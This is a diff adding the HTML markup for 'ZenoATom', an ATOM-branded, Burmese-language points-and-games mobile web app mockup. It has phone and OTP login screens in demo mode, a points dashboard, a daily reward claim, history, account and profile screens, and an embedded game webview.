@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#e60000">
+<title>ZenoATom — Points & Games</title>
+<link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+
+<!-- ═══════════ APP CONTAINER ═══════════ -->
+<div class="app">
+
+  <!-- ── Fake Android status bar ── -->
+  <div class="statusbar" id="statusbar">
+    <span id="statusTime">9:41</span>
+    <span class="icons">
+      <span>📶</span><span>🔋</span>
+    </span>
+  </div>
+
+  <!-- ── Top bar (hidden on splash/cityrun) ── -->
+  <div class="topbar" id="topbar" style="display:none;">
+    <span class="back" id="topbarBack" onclick="showScreen('dashboard')">‹</span>
+    <span class="title" id="topbarTitle">ZenoATom</span>
+    <span class="action" id="topbarAction"></span>
+  </div>
+
+  <!-- ═══════════ SCREEN: SPLASH ═══════════ -->
+  <div class="screen splash active" id="screen-splash">
+    <div class="logo">ATOM</div>
+    <div class="tag">Points · Games · Rewards</div>
+    <div class="spinner"></div>
+  </div>
+
+  <!-- ═══════════ SCREEN: LOGIN (Phone) ═══════════ -->
+  <div class="screen" id="screen-login">
+    <div style="text-align:center;padding:40px 0 30px;">
+      <div style="font-size:42px;font-weight:800;color:var(--atom-red);letter-spacing:2px;">ATOM</div>
+      <div style="color:var(--atom-text-dim);font-size:13px;margin-top:6px;">မြန်မာ့ဆက်သွယ်ရေးဝန်ကြီးများ</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">📱 ဖုန်းနံပါတ်ဖြင့် လော့ဂ်အင်</div>
+      <form id="loginForm">
+        <div class="field">
+          <label>ဖုန်းနံပါတ်</label>
+          <input type="tel" id="phoneInput" inputmode="numeric"
+                 placeholder="09xxxxxxxx" maxlength="13" autocomplete="tel">
+        </div>
+        <button type="submit" class="btn">OTP ပို့ရန်</button>
+      </form>
+      <div class="text-center text-dim" style="font-size:12px;margin-top:12px;">
+        လော့ဂ်အင် လုပ်ခြင်းဖြင့် Terms ကို သဘောတူပါသည်
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════ SCREEN: OTP ═══════════ -->
+  <div class="screen" id="screen-otp">
+    <div style="text-align:center;padding:30px 0;">
+      <div style="font-size:30px;font-weight:800;color:var(--atom-red);">ATOM</div>
+    </div>
+    <div class="card">
+      <div class="card-title">🔐 OTP အတည်ပြုပါ</div>
+      <p class="text-dim" style="font-size:13px;">
+        <span id="otpPhoneDisplay">09xxxxxxxx</span> သို့ OTP ပို့ထားပါသည်
+      </p>
+      <div class="otp-row mt-12">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+      </div>
+      <button class="btn mt-16" id="resendOtpBtn" style="margin-top:18px;">OTP ပြန်ပို့ပါ</button>
+      <p class="text-dim text-center" style="font-size:11px;margin-top:14px;">
+        Demo mode — OTP: <b>123456</b>
+      </p>
+    </div>
+  </div>
+
+  <!-- ═══════════ SCREEN: DASHBOARD ═══════════ -->
+  <div class="screen active" id="screen-dashboard">
+    <div class="hero">
+      <div class="label">လက်ကျန် points</div>
+      <div class="value" id="dashBalance">0 pts</div>
+      <div class="meta">
+        <span id="dashName">User</span> ·
+        <span id="dashPhone">09xxxxxxxx</span>
+      </div>
+    </div>
+
+    <div class="quick-grid">
+      <div class="quick-tile" onclick="showScreen('claim')">
+        <div class="icon">🎁</div>
+        <div class="label">Claim</div>
+      </div>
+      <div class="quick-tile" onclick="showScreen('history')">
+        <div class="icon">📊</div>
+        <div class="label">History</div>
+      </div>
+      <div class="quick-tile" onclick="openCityRun()">
+        <div class="icon">🎮</div>
+        <div class="label">Games</div>
+      </div>
+      <div class="quick-tile" onclick="showScreen('accounts')">
+        <div class="icon">👤</div>
+        <div class="label">Account</div>
+      </div>
+    </div>
+
+    <div class="banner" onclick="showScreen('claim')">
+      <div class="icon">🎁</div>
+      <div class="body">
+        <h4 id="dashClaimStatus">Mystery Box</h4>
+        <p>နေ့စဉ် ထပ်ရယူနိုင်ပါသည်</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title flex between">
+        <span>မကြာသေးမီ မှတ်တမ်း</span>
+        <span class="text-dim" style="font-size:11px;cursor:pointer;" onclick="showScreen('history')">အားလုံး ›</span>
+      </div>
+      <div id="dashRecent"></div>
+    </div>
+  </div>
+
+  <!-- ═══════════ SCREEN: CLAIM ═══════════ -->
+  <div class="screen" id="screen-claim">
+    <div class="card text-center">
+      <div class="giftbox" id="giftBox">🎁</div>
+      <div style="font-size:18px;font-weight:700;margin-bottom:4px;">Mystery Box</div>
+      <div class="text-dim" id="claimHint" style="font-size:13px;">Mystery box ဖွင့်ပြီး points ရယူပါ</div>
+      <button class="btn mt-16" id="claimBtn">Claim Now</button>
+      <p class="text-dim" style="font-size:11px;margin-top:14px;">
+        နေ့တိုင်း တစ်ကြိမ်သာ Claim လုပ်နိုင်ပါသည်
+      </p>
+    </div>
+  </div>
+
+  <!-- ═══════════ SCREEN: HISTORY ═══════════ -->
+  <div class="screen" id="screen-history">
+    <div class="card">
+      <div class="card-title">ကစားခြင်း မှတ်တမ်း</div>
+      <div id="historyList"></div>
+    </div>
+  </div>
+
+  <!-- ═══════════ SCREEN: ACCOUNTS ═══════════ -->
+  <div class="screen" id="screen-accounts">
+    <div class="section-title">အကောင့်များ</div>
+    <div id="accountsList"></div>
+  </div>
+
+  <!-- ═══════════ SCREEN: PROFILE ═══════════ -->
+  <div class="screen" id="screen-profile">
+    <div class="card text-center">
+      <div style="width:72px;height:72px;background:var(--atom-red);border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:700;" id="profileAvatar">?</div>
+      <div style="font-size:18px;font-weight:700;" id="profileName">User</div>
+      <div class="text-dim" id="profilePhone" style="font-size:13px;">09xxxxxxxx</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">အကောင့် အချက်အလက်</div>
+      <div class="flex between" style="padding:10px 0;">
+        <span class="text-dim">Points</span>
+        <b id="profilePoints">0</b>
+      </div>
+      <div class="flex between" style="padding:10px 0;">
+        <span class="text-dim">ဝင်ရောက်သည့်နေ့</span>
+        <b id="profileJoined">-</b>
+      </div>
+    </div>
+
+    <button class="btn btn-outline" id="logoutBtn" style="margin-top:20px;">လော့ဂ်အောက် ထွက်ပါ</button>
+  </div>
+
+  <!-- ═══════════ SCREEN: CITYRUN (WebView) ═══════════ -->
+  <div class="screen" id="screen-cityrun" style="padding:0;">
+    <div class="webview-bar">
+      <span style="cursor:pointer;" id="cityrunBack">‹</span>
+      <span class="webview-spinner"></span>
+      <span class="url" id="cityrunUrl">https://cityrun.pro</span>
+    </div>
+    <iframe class="webview-frame" id="cityrunFrame" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+  </div>
+
+  <!-- ═══════════ BOTTOM NAV ═══════════ -->
+  <div class="bottomnav" id="bottomnav">
+    <div class="nav-item active" onclick="showScreen('dashboard')">
+      <span class="icon">🏠</span>
+      <span class="label">Home</span>
+    </div>
+    <div class="nav-item" onclick="showScreen('claim')">
+      <span class="icon">🎁</span>
+      <span class="label">Claim</span>
+    </div>
+    <div class="nav-item" onclick="showScreen('history')">
+      <span class="icon">📊</span>
+      <span class="label">History</span>
+    </div>
+    <div class="nav-item" onclick="showScreen('accounts')">
+      <span class="icon">👥</span>
+      <span class="label">Account</span>
+    </div>
+    <div class="nav-item" onclick="showScreen('profile')">
+      <span class="icon">⚙</span>
+      <span class="label">Profile</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script src="js/app.js"></script>
+</body>
+</html>
